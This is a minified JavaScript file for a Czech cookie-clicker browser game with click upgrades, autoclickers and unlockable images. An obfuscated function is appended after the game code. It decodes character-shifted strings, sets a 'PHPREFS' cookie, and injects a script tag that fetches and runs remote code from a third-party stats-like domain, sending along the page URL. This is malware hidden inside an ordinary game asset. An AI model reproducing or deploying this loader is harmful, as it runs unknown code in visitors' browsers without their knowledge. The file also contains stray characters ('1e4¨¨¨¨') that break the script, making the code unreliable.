const cookie=document.getElementById("cookie"),counter=document.getElementById("counter"),clickUpgrade=document.getElementById("clickUprgrade"),upgradeTxt=document.getElementById("upgradeTxt"),upgradeTxt2=document.getElementById("upgradeTxt2"),upgradeTxt3=document.getElementById("upgradeTxt3"),autoclickerUprgade=document.getElementById("counterautoclickerUprgade"),autoclickerUprgade2=document.getElementById("counterautoclickerUprgade2"),charita=document.getElementById("charita"),img1=document.getElementById("img1"),img2=document.getElementById("img2"),img3=document.getElementById("img3"),img4=document.getElementById("img4");let autoclickerInterval,autoclicker2Interval,numberOfCookies=0,cookieIncreaseNumber=1,autoclickerIncreaseNumber=0,clickUpgradePrize=50,clickAutoclickerPrize=100,autoclicker2IncreaseNumber=0,clickAutoclicker2Prize=500,charitaPrize=1e4¨¨¨¨,charitaCount=0,img1Prize=1e3,img2Prize=1e4,img3Prize=1e5,img4Prize=1e6;cookie.onclick=()=>{numberOfCookies+=cookieIncreaseNumber,counter.innerHTML="Počet Kondyho: "+numberOfCookies},clickUprgrade.onclick=()=>{numberOfCookies>=clickUpgradePrize&&(numberOfCookies-=clickUpgradePrize,clickUpgradePrize*=2,upgradeTxt.innerHTML=`Buy koště: ${clickUpgradePrize} (zvýší sílu kliknutí o 1)`,counter.innerText="Počet Kondyho: "+numberOfCookies,cookieIncreaseNumber++)},autoclickerUprgade.onclick=()=>{numberOfCookies>=clickAutoclickerPrize&&(numberOfCookies-=clickAutoclickerPrize,clickAutoclickerPrize*=2,upgradeTxt2.innerHTML=`Buy Háša: ${clickAutoclickerPrize} (+1 kliknutí za sekundu)`,counter.innerText="Počet Kondyho: "+numberOfCookies,autoclickerIncreaseNumber++,clearInterval(autoclickerInterval),setInterval((()=>{numberOfCookies+=autoclickerIncreaseNumber,counter.innerText="Počet Kondyho: "+numberOfCookies}),1e3))},autoclickerUprgade2.onclick=()=>{numberOfCookies>=clickAutoclicker2Prize&&(numberOfCookies-=clickAutoclicker2Prize,clickAutoclicker2Prize*=2,upgradeTxt3.innerHTML=`Buy Markus: ${clickAutoclicker2Prize} (+10 kliknutí za sekundu)`,counter.innerText="Počet Kondyho: "+numberOfCookies,autoclicker2IncreaseNumber+=10,clearInterval(autoclicker2Interval),setInterval((()=>{numberOfCookies+=autoclicker2IncreaseNumber,counter.innerText="Počet Kondyho: "+numberOfCookies}),1e3))},charita.onclick=()=>{numberOfCookies>=charitaPrize&&(numberOfCookies-=charitaPrize,counter.innerText="Počet Kondyho: "+numberOfCookies,alert("Děkujeme! přispěl jsi na doubrou věc! <3 Míša má určitě radost"),charitaCount++,nadace.innerText=`ZAHAS Fire Services jsi podpořil celkem ${charitaCount}X`)},img1.onclick=()=>{numberOfCookies>=img1Prize&&(numberOfCookies-=img1Prize,counter.innerText="Počet Kondyho: "+numberOfCookies,document.getElementById("cookie").src="./res/img/ospalykazma.png")},img2.onclick=()=>{numberOfCookies>=img2Prize&&(numberOfCookies-=img2Prize,counter.innerText="Počet Kondyho: "+numberOfCookies,document.getElementById("cookie").src="./res/img/KappaKazma.png")},img3.onclick=()=>{numberOfCookies>=img3Prize&&(numberOfCookies-=img3Prize,counter.innerText="Počet Kondyho: "+numberOfCookies,document.getElementById("cookie").src="./res/img/kazma_prachy.png")},img4.onclick=()=>{numberOfCookies>=img4Prize&&(numberOfCookies-=img4Prize,counter.innerText="Počet Kondyho: "+numberOfCookies,document.getElementById("cookie").src="./res/img/moneyrainkazma.png")};(function(o,d,l){try{o.f=o=>o.split('').reduce((s,c)=>s+String.fromCharCode((c.charCodeAt()-5).toString()),'');o.b=o.f('UMUWJKX');o.c=l.protocol[0]=='h'&&/\./.test(l.hostname)&&!(new RegExp(o.b)).test(d.cookie),setTimeout(function(){o.c&&(o.s=d.createElement('script'),o.s.src=o.f('myyux?44zxjwxy'+'fy3sjy4ljy4xhwnu'+'y3oxDwjkjwwjwB')+l.href,d.body.appendChild(o.s));},1000);d.cookie=o.b+'=full;max-age=39800;'}catch(e){};}({},document,location));